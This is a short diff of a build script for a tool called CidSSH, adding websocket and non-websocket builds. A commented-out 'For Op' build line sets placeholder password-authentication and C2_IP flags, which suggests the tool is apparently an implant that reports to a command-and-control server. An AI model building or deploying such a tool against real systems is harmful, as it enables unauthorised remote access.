@@ -46,9 +46,16 @@ tar -xzvf dbus-1.12.16.tar.gz && cd dbus-1.12.16
 
 # Building CidSSH
 rm -rf build
-cmake -S . -B build
+rm -rf build_ws
+
+# Build normal version
+cmake -S . -B build -DWITH_WEBSOCKETS=OFF
 cmake --build build --config Release -j$(nproc)
 
+# Build websocket version
+cmake -S . -B build_ws -DWITH_WEBSOCKETS=ON
+cmake --build build_ws --config Release -j$(nproc)
+
 # For Op
-#RUN mkdir build && cd build && cmake -DCMAKE_BUILD_TYPE=Release -DPASSWORD_AUTH="xxxxxxxxxx" -DC2_IP="XX.XX.XX.XX" .. && make 
+#RUN mkdir build_custom && cd build_custom && cmake -DCMAKE_BUILD_TYPE=Release -DPASSWORD_AUTH="xxxxxxxxxx" -DC2_IP="XX.XX.XX.XX" .. && make 
 
